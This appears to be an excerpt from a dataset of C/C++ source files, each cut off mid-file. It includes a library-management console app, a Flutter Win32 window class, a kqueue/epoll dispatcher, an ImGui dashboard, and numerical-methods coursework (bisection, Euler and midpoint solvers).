Member\" << endl;\n        cout << \"7. Display All Members\" << endl;\n        cout << \"8. Save Data\" << endl;\n        cout << \"0. Exit\" << endl;\n        cout << \"\\nEnter your choice: \";\n        cin >> choice;\n\n        switch (choice) {\n            case 1: library.addBook(); break;\n            case 2: library.issueBook(); break;\n            case 3: library.returnBook(); break;\n            case 4: library.searchBooks(); break;\n            case 5: library.displayAllBooks(); break;\n            case 6: library.addMember(); break;\n            case 7: library.displayAllMembers(); break;\n            case 8: library.saveBooksToFile(); library.saveMembersToFile(); break;\n            case 0: cout << \"Exiting...\\n\"; break;\n            default: cout << \"Invalid choice!\\n\";\n        }\n    } while (choice != 0);\n\n    return 0;\n}\n\n// Library member function definitions\nvoid Library::addBook() {\n    Book book;\n    cout << \"Enter Book Title: \";\n    cin.ignore(); // Clear input buffer\n    getline(cin, book.title);\n    cout << \"Enter Author: \";\n    getline(cin, book.author);\n    cout << \"Enter ISBN: \";\n    cin >> book.ISBN;\n    book.available = true;\n    books.push_back(book);\n    cout << \"Book added successfully!\\n\";\n}\n\nvoid Library::issueBook() {\n    string ISBN;\n    int memberID;\n    bool foundBook = false;\n\n    cout << \"\\nEnter ISBN of the book to issue: \";\n    cin >> ISBN;\n\n    // Find the book by ISBN\n    for (size_t i = 0; i < books.size(); ++i) {\n        if (books[i].ISBN == ISBN && books[i].available) {\n            foundBook = true;\n\n            cout << \"Enter Member ID: \";\n            cin >> memberID;\n\n            // Find the member by ID and add borrowed book ISBN\n            for (size_t j = 0; j < members.size(); ++j) {\n                if (members[j].memberID == memberID) {\n                    members[j].borrowedBooks.push_back(ISBN);\n                    books[i].available = false;  // Mark book as issued\n                    cout << \"Book issued successfully to \" << members[j].name << \".\" << endl;\n                    return;\n                }\n            }\n            cout << \"Invalid Member ID!\\n\";\n            books[i].available = true; // Revert availability change\n            return;\n        }\n    }\n\n    if (!foundBook) {\n        cout << \"Book not found or unavailable!\\n\";\n    }\n}\n\nvoid Library::returnBook() {\n    string ISBN;\n    int memberID;\n    bool foundBook = false;\n\n    cout << \"Enter ISBN of the book to return: \";\n    cin >> ISBN;\n\n    // Find the book by ISBN\n    for (size_t i = 0; i < books.size(); ++i) {\n        if (books[i].ISBN == ISBN) {\n            foundBook = true;\n            books[i].available = true;   // Mark book as available\n\n            cout << \"Enter Member ID: \";\n            cin >> memberID;\n\n            // Find the member by ID and remove borrowed book ISBN\n            for (size_t j = 0; j < members.size(); ++j) {\n                if (members[j].memberID == memberID) {\n                    vector<string>::iterator it = find(members[j].borrowedBooks.begin(), members[j].borrowedBooks.end(), ISBN);\n                    if (it != members[j].borrowedBooks.end()) {\n                        members[j].borrowedBooks.erase(it);\n                        cout << \"Book returned successfully!\\n\";\n                        return;\n                    } else {\n                        cout << \"Member has not borrowed this book!\\n\";\n                        return;\n                    }\n                }\n            }\n        }\n    }\n\n    if (!foundBook) {\n        cout << \"Book not found!\\n\";\n    }\n}\n\nvoid Library::searchBooks() {\n    string searchTerm;\n    int choice;\n\n    cout << \"Search by:\\n\";\n    cout << \"1. Title\\n\";\n    cout << \"2. Author\\n\";\n    cout << \"3. ISBN\\n\";\n    cout << \"Enter your choice: \";\n    cin >> choice;\n    if (choice > 3 || choice < 1){\n        cout << \"Invalid Choice. Please try again.\" << endl;\n    }\n    else{\n    cin.ignore(); // Cl",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"VecMatPersistor.h\"\n#include <mutex>\n#include <iostream>\n\n// #include <sys/stat.h>\n// #include <sys/mman.h> \n// #include <fcntl.h>\n#include <stdio.h>\n\nusing namespace std;\nusing namespace cv;\n\nVecMatPersistor::VecMatPersistor() \n    : /*file(-1),*/ data(nullptr), length(0) {\n}\n\nVecMatPersistor::VecMatPersistor(VecMatPersistor&& o) \n    : file(std::move(o.file)), length(std::move(o.length)), data(std::move(o.data)), lookup(std::move(o.lookup)), keepInMemory(o.keepInMemory) {\n    // o.file = -1;\n    o.data = nullptr;\n}\n\nVecMatPersistor::~VecMatPersistor() {\n    close();\n}\n\nVecMatPersistor& VecMatPersistor::operator = (VecMatPersistor&& o) {\n    file = o.file; // o.file = -1;\n    data = std::move(o.data); o.data = nullptr;\n    lookup = std::move(o.lookup);\n    length = std::move(o.length);\n    keepInMemory = o.keepInMemory;\n    return *this;\n}\n\nbool VecMatPersistor::isOpen() {\n    // return file != -1;\n    return file.is_open();\n}\n\nbool VecMatPersistor::exists(const std::string& filename) {\n    FILE *file = fopen(filename.c_str(), \"r\");\n    if (file != nullptr) {\n        fclose(file);\n        return true;\n    }\n    return false;\n}\n\nvoid VecMatPersistor::close() {\n    //file.release();\n    // if (file != -1) {\n    //     munmap(data, length);\n    //     ::close(file);\n    // }\n    file.close();\n    lookup.clear();\n}\n\nVecMatPersistor VecMatPersistor::open(const std::string& filename, bool keepInMemory) {\n    //FILE* file = fopen(filename.c_str(), \"rb\");\n    // int file = ::open(filename.c_str(), O_RDONLY);\n    // if (file < 0) {\n    //     std::cout << \"File does not exist: \" << filename << std::endl;\n    //     exit(-1);\n    //     return VecMatPersistor();\n    // }\n\n    // struct stat s;\n    // int status = fstat(file, &s);\n    // if (file < 0) {\n    //     std::cout << \"Can not read length of file: \" << filename << std::endl;\n    //     exit(-1);\n    //     return VecMatPersistor();\n    // }\n\n\n    /*char* data = nullptr;\n    if (keepInMemory) {\n        fseek(file, 0, SEEK_END);\n        size_t fsize = ftell(file);\n        fseek(file, 0, SEEK_SET);\n\n        data = (char*)malloc(fsize + 1);\n        size_t ret = fread(data, 1, fsize, file);\n        assert(ret == fsize);\n    } else {\n\n    }*/\n    keepInMemory = true;\n    boost::iostreams::mapped_file_source file;\n    file.open(filename);\n\n    if (!file.is_open()) {\n        std::cout << \"File does not exist: \" << filename << std::endl;\n        exit(-1);\n        return VecMatPersistor();\n    }\n\n    char* data = (char*)file.data();\n    \n    // char* data = (char*)mmap(0, (size_t)s.st_size, PROT_READ, MAP_PRIVATE, file, 0);\n    // if (data == MAP_FAILED) {\n    //     std::cout << \"Can not map file: \" << filename << std::endl;\n    //     exit(-1);\n    //     return VecMatPersistor();\n    // }\n\n    VecMatPersistor pers;\n    pers.data = data;\n    pers.length = file.size(); // s.st_size;\n    pers.file = file;\n    pers.keepInMemory = keepInMemory;\n\n    int ret;\n    size_t descriptorCount = *reinterpret_cast<size_t*>(&data[0]);\n\n    //fseek(file, 0, SEEK_SET);\n    //ret = fread(static_cast<void*>(&descriptorCount), 1, sizeof(descriptorCount), pers.file.get());\n    //assert(ret == sizeof(descriptorCount));\n\n    /*std::vector<DescriptorHeader> descriptors;\n    descriptors.resize(descriptorCount);\n    ret = fread(static_cast<void*>(&descriptors[0]), 1, sizeof(decltype(descriptors)::value_type) * descriptorCount, pers.file.get());\n    if (ret != sizeof(decltype(descriptors)::value_type) * descriptorCount) {\n        std::cout << \"Error reading file: \" << filename << std::endl;\n    }\n    assert(ret == sizeof(decltype(descriptors)::value_type) * descriptorCount);*/\n\n    for (size_t i = 0; i < descriptorCount; ++i) {\n        DescriptorHeader descriptor = *reinterpret_cast<DescriptorHeader*>(&data[sizeof(descriptorCount) + i * sizeof(DescriptorHeader)]);\n        pers.lookup[descriptor.frame] = std::make_tuple(descriptor.offset, descriptor.count);\n    }\n\n    return pers;\n}\n\nbool VecMatPersistor::create(const std::string& filename, const std::vector<std::pair<Mat, uint32_t>>& frames) {\n    FILE* file = fopen(filename.c_str(), \"wb\");\n    if (file == nullptr) {\n        return false;\n    }\n\n    size_t offset = sizeof(DescriptorHeader) * frames.size() + sizeof(size_t);\n    std::vector<DescriptorHeader> descriptors;\n    for(size_t i = 0; i < frames.size(); ++i) {\n        descriptors.push_back(\n            {\n                static_cast<uint64_t>(offset),\n                static_cast<uint32_t>(frames[i].first.rows),\n                static_cast<uint32_t>(frames[i].second)\n            }\n        );\n        offset += sizeof(MatHeader) + frames[i].first.rows * frames[i].first.cols * frames[i].first.elemSize();\n    }\n\n    size_t descriptorHeaders = descriptors.size();\n    fwrite(static_cast<void*>(&descriptorHeaders), 1, sizeof(size_t), file);\n    fwrite(static_cast<void*>(&descriptors[0]), 1, sizeof(decltype(descriptors)::value_type) * descriptors.size(), file);\n\n    for(size_t i = 0; i <",
    "\ufeff#pragma once\n\n#include \"MainDashboardWidget.h\"\n#include \"imgui.h\"\n#include \"gui.h\"\n\nnamespace tadaima\n{\n    namespace gui\n    {\n        namespace widget\n        {\n\n            void MainDashboardWidget::initialize([[maybe_unused]] const tools::DataPackage& r_package)\n            {\n\n            }\n\n            void MainDashboardWidget::draw(bool* p_open)\n            {\n                if( !ImGui::Begin(\"Main Dashboard\", p_open, ImGuiWindowFlags_NoDecoration) )\n                {\n                    ImGui::End();\n                    return;\n                }\n\n                // Header\n                ImGui::Text((const char*)u8\"Good morning, [Username]! \u4eca\u65e5\u306e\u5929\u6c17: \u6674\u308c, 25\u00b0C\");\n                ImGui::ProgressBar(0.65f, ImVec2(-1.0f, 0.0f), \"65% complete\");\n\n                // Word of the Day\n                ImGui::Separator();\n                ImGui::Text((const char*)u8\"Word of the Day: \\\"\u8336\\\" (\u3061\u3083) - Tea\");\n                ImGui::Text((const char*)u8\"Example: \u5f7c\u306f\u6bce\u671d\u8336\u3092\u98f2\u3080\u3002 (He drinks tea every morning.)\");\n\n                // Performance Graphs\n                ImGui::Separator();\n                ImGui::Text(\"Performance Graphs:\");\n                ImGui::Text(\"Vocab Acquisition [\u2593\u2593\u2593\u2593\u2592\u2592\u2592] Pronunciation [\u2593\u2593\u2593\u2592\u2592\u2592\u2592]\");\n\n                // Cultural Insight\n                ImGui::Separator();\n                ImGui::Text(\"Cultural Insight: \\\"Golden Week\\\" - A week of holidays in Japan...\");\n\n                ImGui::End();\n            }\n        }\n    }\n}",
    "#include \"cs/network/dispatch.hpp\"\n#include \"cs/diagnostics/exception.hpp\"\n#include \"cs/type_traits/move.hpp\"\n#include \"cs/hint.hpp\"\n#include <unistd.h>\n\n#include <iostream>\n\n\n// -- public methods ----------------------------------------------------------\n\n/* poll */\nauto cs::dispatch::poll(void) -> void {\n\t___self::_shared()._poll();\n}\n\n/* remove */\nauto cs::dispatch::remove(cs::io_event& ___obs) -> void {\n\t___self::_shared()._remove(___obs);\n}\n\n/* disable */\nauto cs::dispatch::disable(cs::io_event& ___obs) -> void {\n\t___self::_shared()._disable(___obs);\n}\n\n/* run */\nauto cs::dispatch::run(void) -> void {\n\t___self::_shared()._run();\n}\n\n/* stop */\nauto cs::dispatch::stop(void) -> void {\n\t___self::_shared()._running = false;\n}\n\n\n\n// -- private lifecycle -------------------------------------------------------\n\n/* default constructor */\ncs::dispatch::dispatch(void)\n#if defined(___cs_os_macos)\n: _handle{::kqueue()},\n#elif defined(___cs_os_linux)\n: _handle{::epoll_create1(0)},\n#endif\n  _events{}, _map{}, _running{true} {\n\n\t// check for error\n\tif (not _handle)\n\t\tthrow cs::runtime_error{\"failed to create kqueue\"};\n\n\t// allocate events\n\t_events.resize(64);\n}\n\n\n// -- private static methods --------------------------------------------------\n\n/* shared */\nauto cs::dispatch::_shared(void) -> ___self& {\n\tstatic ___self ___sh;\n\treturn ___sh;\n}\n\n/* data */\nauto cs::dispatch::_data(___event& ___ev) noexcept -> cs::io_event& {\n\n\t#if defined(___cs_os_macos)\n\treturn *reinterpret_cast<cs::io_event*>(___ev.udata);\n\n\t#elif defined(___cs_os_linux)\n\treturn *reinterpret_cast<cs::io_event*>(___ev.data.ptr);\n\n\t#endif\n}\n\n/* event */\nauto cs::dispatch::_event(___event& ___ev) noexcept -> cs::ev_flag {\n\n\t#if defined(___cs_os_macos)\n\treturn ___ev.filter;\n\n\t#elif defined(___cs_os_linux)\n\treturn ___ev.events;\n\n\t#endif\n}\n\n\n// -- non-member functions ------------------------------------------------\n\nstatic auto ev_read(const cs::ev_flag ___ev) noexcept -> bool {\n\n\t#if defined(___cs_os_macos)\n\treturn ___ev & EVFILT_READ ? true : false;\n\t#elif defined(___cs_os_linux)\n\treturn ___ev & EPOLLIN ? true : false;\n\t#endif\n}\n\nstatic auto ev_write(const cs::ev_flag ___ev) noexcept -> bool {\n\n\t#if defined(___cs_os_macos)\n\treturn ___ev & EVFILT_WRITE ? true : false;\n\t#elif defined(___cs_os_linux)\n\treturn ___ev & EPOLLOUT ? true : false;\n\t#endif\n}\n\n// -- private methods ---------------------------------------------------------\n\n\n/* poll */\nauto cs::dispatch::_poll(void) -> void {\n\n\t// wait for events\n\tconst auto nev = _wait();\n\n\tif (nev == 0)\n\t\treturn;\n\n\t::write(STDOUT_FILENO, \"\\n\", 1U);\n\n\t// process events\n\tfor (size_type i = 0U; i < nev; ++i) {\n\n\t\t// get event flag\n\t\tconst cs::ev_flag ev = _event(_events[i]);\n\t\t// get observer\n\t\tcs::io_event& ___io = _data(_events[i]);\n\n\t\t// check event\n\t\tif (ev_read(ev))\n\t\t\t___io.read();\n\n\t\telse if (ev_write(ev))\n\t\t\t___io.send();\n\n\t\telse\n\t\t\tthrow cs::runtime_error{\"unknown event\"};\n\t}\n\n\t// resize events\n\tif (nev == _events.size())\n\t\t_events.resize(_events.size() * 2U);\n}\n\n/* wait */\nauto cs::dispatch::_wait(void) -> size_type {\n\n\t// -- macos ---------------------------------------------------------------\n\n\t#if defined(___cs_os_macos)\n\t// compute timeout\n\tconstexpr struct ::timespec timeout {\n\t\t.tv_sec  =  DISPATCH_TIMEOUT / 1'000U,\n\t\t.tv_nsec = (DISPATCH_TIMEOUT % 1'000U) * 1'000'000U\n\t};\n\t// wait for events\n\tconst auto ret = ::kevent(_handle, nullptr, 0, _events.data(),\n\t\t\t\t\t\t\t\t\t\t\t\t\tstatic_cast<int>(_events.size()),\n\t\t\t\t\t\t\t\t\t\t\t\t\t&timeout);\n\n\n\t// -- linux ---------------------------------------------------------------\n\n\t#elif defined(___cs_os_linux)\n\t// wait for events\n\tconst auto ret = ::epoll_wait(_handle, _events.data(),\n\t\t\t\t\t\t\t\t\t\t\tstatic_cast<int>(_events.size()),\n\t\t\t\t\t\t\t\t\t\t\tDISPATCH_TIMEOUT);\n\t// see epoll_pwait\n\t#endif\n\n\n\t// -- common --------------------------------------------------------------\n\n\t// check for error\n\tif (ret < 0)\n\t\tthrow cs::runtime_error{\"failed to wait for events\"};\n\n\treturn static_cast<size_type>(ret);\n}\n\n/* add */\nauto cs::dispatch::_add(cs::unique_ptr<cs::io_event>&& ___io) -> void {\n\n\t// check state\n\tif (not _running)\n\t\treturn;\n\n\tauto it = _map.emplace(___io.get(), cs::move(___io));\n\n\tcs::io_event* user_data = it.first->second.get();\n\tconst int descriptor = user_data->descriptor();\n\n\t// -- macos ---------------------------------------------------------------\n\n\t#if defined(___cs_os_macos)\n\n\tstd::cout << \"adding descriptor to dispatch: \" << descriptor << std::endl;\n\n\t// create event (enable EOF notification)\n\t___event event {\n\t\t.ident  = static_cast<uintptr_t>(descriptor),\n\t\t.filter = EVFILT_READ,\n\t\t.flags  = EV_ADD | EV_ENABLE | EV_EOF,\n\t\t.fflags = 0U,\n\t\t.data   = 0,\n\t\t.udata  = user_data\n\t};\n\n\t// EV_CLEAR info: make\n\n\t// add event\n\tif (::kevent(_handle, &event, 1, nullptr, 0, nullptr) != 0)\n\t\tthrow cs::runtime_error{\"failed to add descriptor to kqueue\"};\n\n\n\t// -- linux ---------------------------------------------------------------\n\n\t#elif defined(___cs_os_linux)\n\n\t// create event\n\tstruct e",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <windows.h>\n#define eps 1e-3\n\nvoid read_file(char filename[], int &n, float A[][100], int &check);\nvoid input_file(char a[], float A[][100], int &n);\nvoid change(float A[][100], float B[], int n);\nvoid print_POLYNOMIAL(float B[], int n);\nfloat Fx(float B[], int n, float x0);\nvoid enter_input(float &a, float &b, float B[], int n);\nfloat solve(float B[], float a, float b, int n);\nvoid information();\nvoid result(char a[]);\nint menu_input(int &com);\nvoid mtA(float A[][100], int &n);\nvoid setcolor(int backgound_color, int text_color);\n\nint main()\n{\n    int n,com;\n    float a, b,c;\n    char name[100], re[100], other[1],newP[1];\n    float A[100][100];\n    float B[100];\n\n    information();//Introduce the topic and related information\n   \n    do{\n       menu_input(com);\n       if(com==1){\n        setcolor(0,3);\n        printf(\"\\tMoi ban nhap ma tran A\\n\");\n        printf(\"\\tNhap buc cua ma tran: \");\n        setcolor(0,8);\n        scanf(\"%d\", &n);\n        mtA(A, n);\n       }\n       else if(com==2){\n        (getchar()) != '\\n';         \n        input_file(name,A,n);\n       }\n       \n        setcolor(0,15);\n        change(A,B,n);\n        print_POLYNOMIAL(B,n);\n         while (1){\n            enter_input(a,b,B,n);\n            c=solve(B,a,b,n);\n            setcolor(0,15);\n            printf(\"\\n    Bang gia tri thuc hien phuong phap chia doi\\n\");\n            setcolor(0,3);\n            printf(\"\\nNgiem cua phuong trinh la:  %.3f\", c);\n            printf(\"\\n\\nBan co muon nhap khoang nghiem khac khong (y/n)? \");\n            setcolor(0,8);\n            scanf(\"%s\",other);\n            if (other[0]!='y') break;\n        }\n        setcolor(0,3);\n        printf(\"\\n\\nBan co muon tim nghiem voi da thuc khac khong(Neu muon nhap lai thi chon c, con khong muon thi nhap phim bat ki)? \");\n        setcolor(0,8);\n        scanf(\"%s\", newP);\n    }while(newP[0]=='c');\n    }\n\nvoid setcolor(int backgound_color, int text_color)\n{\n    HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);\n    int color_code = backgound_color * 16 + text_color;\n    SetConsoleTextAttribute(hStdout, color_code);\n}\n\nvoid information()\n{\n    int i;\n    setcolor(0, 3);\n    printf(\"\\n%9c\", 201);\n    for (i = 0; i <= 85; i++)\n        printf(\"%c\", 205);\n    printf(\"%c\", 187);\n    printf(\"\\n        %c %86c\", 4, 4);\n    printf(\"\\n        %c                             DO AN LAP TRINH TINH TOAN                                %c\", 4, 4);\n    printf(\"\\n        %c                   DE TAI: Tim nghiem gan dung bang phuong phap chia doi              %c\", 4, 4);\n    printf(\"\\n        %c %86c\", 4, 4);\n    printf(\"\\n        %c       Sinh vien thuc hien:                       Giao vien huong dan:                %c\", 4, 4);\n    printf(\"\\n        %c           %c Le Ngoc Lam Na                            %c Do Thi Tuyet Hoa             %c\", 4, 45, 45, 4);\n    printf(\"\\n        %c           %c Le Xuan Tung Son  %56c\", 4, 45, 4);\n    printf(\"\\n        %c %86c\", 4, 4);\n    printf(\"\\n        %c\", 200);\n    for (i = 0; i <= 85; i++)\n        printf(\"%c\", 205);\n    printf(\"%c\\n\", 188);\n}\n\nvoid read_file(char filename[], int &n, float A[][100], int &check)\n{   setcolor(0,3);\n    FILE *file = fopen(filename, \"r\");\n    if (file == NULL)\n    {\n        check = 0;        \n        return;\n    }\n    fscanf(file, \"%d\", &n); // read array size\n    char a;\n    int s = 0, count = 0;\n\n    // check size file\n    for (int i = 0; i < n; i++)\n    {\n        for (int j = 0; j < n; j++)\n        {\n            if (fscanf(file, \"%f\", &A[i][j]) == 1)\n            { // save data into array A\n                s++;\n                if ((a = fgetc(file)) != '\\n')\n                {\n                    if (a != EOF)\n                        count++;\n                }\n                else\n                {\n                    break;\n                }\n            }\n        }\n        if (count != (n - 1))\n        {\n            check = 2;\n            fclose(file);\n            return;\n        }\n        count = 0;\n    }\n    if (s != n * n)\n    {\n        check = 2;\n        fclose(file);\n        return;\n    }\n    check = 1;\n    fclose;\n}\n\nvoid input_file(char a[], float A[][100], int &n)\n{   \n    setcolor(0,3);\n    int check;\n    do\n    {\n        printf(\"Nhap ten file du lieu: \");\n         setcolor(0, 8);\n        fgets(a, 100, stdin); // input name file to array a\n        a[strcspn(a, \"\\n\")] = 0;\n        setcolor(0,3);\n        read_file(a, n, A, check);\n        if (check == 0)\n        {\n            printf(\"File %s khong ton tai\\n\", a);\n        }\n        else if (check == 2)\n        {\n            printf(\"File %s bi loi \\n\", a);\n        }\n        else\n        {\n            printf(\"Doc file thanh cong\\n\");\n        }\n    } while (check == 0 || check == 2);\n}\n\nvoid change(float A[][100], float B[], int n)\n{ // data analysis\n    B[0] = 0;\n    for (int i = 0; i < n; i++)\n    {\n        for (int j = 0; j < n; j++)\n        {\n            B[i] += A[j][i];\n        }\n    }\n    float max = B[",
    "#include <iostream>\n#include <vector>\n#include <cmath>\n#include <iomanip>\n\nstd::vector<double> operator*(double scalar, const std::vector<double> &v) {\n    std::vector<double> result(v.size());\n    for (int i = 0; i < v.size(); i++) {\n        result[i] = v[i] * scalar;\n    }\n    return result;\n}\n\nstd::vector<double> operator+(const std::vector<double> &v1, const std::vector<double> &v2) {\n    std::vector<double> result(v1.size());\n    for (int i = 0; i < v1.size(); i++) {\n        result[i] = v1[i] + v2[i];\n    }\n    return result;\n}\n\nstd::vector<double> F(double x, const std::vector<double> &y) {\n    std::vector<double> f(2);\n    f[0] = std::cos(-1 + x + y[0] + 3 * y[1]);\n    f[1] = -y[0] * y[0] + 2 * std::sin(y[1]);\n    return f;\n}\n\nvoid Euler(double n, std::vector<double> (*func)(double, const std::vector<double> &), std::vector<double> &a, double x0, double xEnd, double accuracy, int eq) {\n    std::vector<std::vector<double>> container;\n    std::cout << std::setw(2)  << \"i\"; \n    std::cout << std::setw(15) << \"A(h_i)\";\n    std::cout << std::setw(20) << \"A(h_(i-1))-A(h_i)\"; \n    std::cout << std::setw(15) << \"alpha_k\";\n    std::cout << std::setw(15) << \"rich-error\"; \n    std::cout << std::setw(15) << \"order\";\n    std::cout << std::setw(10) << \"n\";\n    std::cout << std::endl;\n\n    double prev_prev_integral = 0.0;\n    double prev_integral = 0.0;\n    for (int i = 0; i < 50; i++) {\n        std::vector<double> yn = a;\n        double h = (xEnd - x0) / n;\n        for (int j = 0; j < n; j++) {\n            yn = yn + h * func(x0 + j * h, yn);\n        }\n        \n        container.push_back(yn);\n\n        double integral = container[i][eq];\n        std::cout << std::setw(2) << i << std::setw(15) << integral;\n        \n        if (i > 0) {\n            double diff = prev_integral - integral;\n            std::cout << std::setw(20) << diff;\n            if (i > 1) {\n                double diff1 = prev_prev_integral - prev_integral; \n                double alpha_k = diff1 / diff;           \n                double richardson = (diff) / (alpha_k - 1.0); \n                std::cout << std::setw(15) << alpha_k; \n                std::cout << std::setw(15) << richardson;\n                std::cout << std::setw(15) << std::log2(diff1 / diff);\n                if (std::abs(richardson) < accuracy) {\n                    std::cout << std::setw(10) << n << std::endl;\n                    std::cout << std::endl;\n                    break;\n                }\n            } else {\n                std::cout << std::setw(45) << \" \";\n            }\n        } else {\n            std::cout << std::setw(65) << \" \";\n        }\n        std::cout << std::setw(10) << n;\n        std::cout << std::endl;\n        prev_prev_integral = prev_integral;\n        prev_integral = integral;\n        n *= 2;\n    }\n    std::cout << std::endl;\n}\n\nvoid Midpoint(double n, std::vector<double> (*func)(double, const std::vector<double> &), std::vector<double> &a, double x0, double xEnd, double accuracy, int eq) {\n    std::vector<std::vector<double>> container;\n    std::cout << std::setw(2)  << \"i\"; \n    std::cout << std::setw(15) << \"A(h_i)\";\n    std::cout << std::setw(20) << \"A(h_(i-1))-A(h_i)\"; \n    std::cout << std::setw(15) << \"alpha_k\";\n    std::cout << std::setw(15) << \"rich-error\"; \n    std::cout << std::setw(15) << \"order\";\n    std::cout << std::setw(10) << \"n\";\n    std::cout << std::endl;\n\n    double prev_prev_integral = 0.0;\n    double prev_integral = 0.0;\n    for (int i = 0; i < 50; i++) {\n        std::vector<double> yn = a;\n        double h = (xEnd - x0) / n;\n        for (int j = 0; j < n; j++) {\n            std::vector<double> k1 = func(x0 + j * h, yn);\n            std::vector<double> k2 = func(x0 + j * h + h * 0.5, yn + 0.5 * h * k1);\n            yn = yn + h * k2;\n        }\n        \n        container.push_back(yn);\n\n        double integral = container[i][eq];\n        std::cout << std::setw(2) << i << std::setw(15) << integral;\n        \n        if (i > 0) {\n            double diff = prev_integral - integral;\n            std::cout << std::setw(20) << diff;\n            if (i > 1) {\n                double diff1 = prev_prev_integral - prev_integral; \n                double alpha_k = diff1 / diff;           \n                double richardson = (diff) / (alpha_k - 1.0); \n                std::cout << std::setw(15) << alpha_k; \n                std::cout << std::setw(15) << richardson;\n                std::cout << std::setw(15) << std::log2(diff1 / diff);\n                if (std::abs(richardson) < accuracy) {\n                    std::cout << std::setw(10) << n << std::endl;\n                    std::cout << std::endl;\n                    break;\n                }\n            } else {\n                std::cout << std::setw(45) << \" \";\n            }\n        } else {\n            std::cout << std::setw(65) << \" \";\n        }\n        std::cout << std::setw(10) << n;\n        std::cout << std::endl;\n        prev_prev_integral = prev_integral;\n        prev_integral = integral;\n        n",
